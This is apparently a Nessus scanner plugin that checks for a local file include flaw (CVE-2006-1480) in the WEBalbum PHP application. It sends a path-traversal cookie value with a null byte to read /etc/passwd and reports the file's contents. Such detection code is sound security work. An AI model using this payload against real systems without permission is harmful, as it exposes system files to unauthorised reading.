#
# (C) Josh Zlatin-Amishav (josh at ramat dot cc)
# GPLv2
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by a
local file include vulnerability. 

Description :

The remote host is running WEBalbum, a photo album application written
in PHP. 

The installed version of WEBalbum fails to sanitize user input to the
'skin2' cookie in 'inc/inc_main.php' before using it to include
arbitrary files.  An unauthenticated attacker may be able to read
arbitrary local files or include a local file that contains commands
which will be executed on the remote host subject to the privileges of
the web server process. 

This flaw is only exploitable if PHP's 'magic_quotes_gpc' is disabled. 

See also : 

http://milw0rm.com/exploits/1608

Solution : 

Unknown at this time.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(21311);
  script_version("$Revision: 1.1 $");
  script_bugtraq_id(17228);
  script_cve_id("CVE-2006-1480");
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"24160");

  name["english"] = "WEBalbum Local File Include Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for file includes in index.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Josh Zlatin-Amishav");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw in index.php to read /etc/passwd.
  req = string(
    "GET /index.php HTTP/1.0\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Cookie: skin2=../../../../../../etc/passwd%00\r\n",
    "\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root
  if ( 'inc_main.php' >< res && egrep(pattern:"root:.*:0:[01]:", string:res) ) 
  {
    content = res - strstr(res, "<br />");

    report = string(
      desc["english"],
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      content
    );

    security_warning(port:port, data:report);
    exit(0);
  }
}
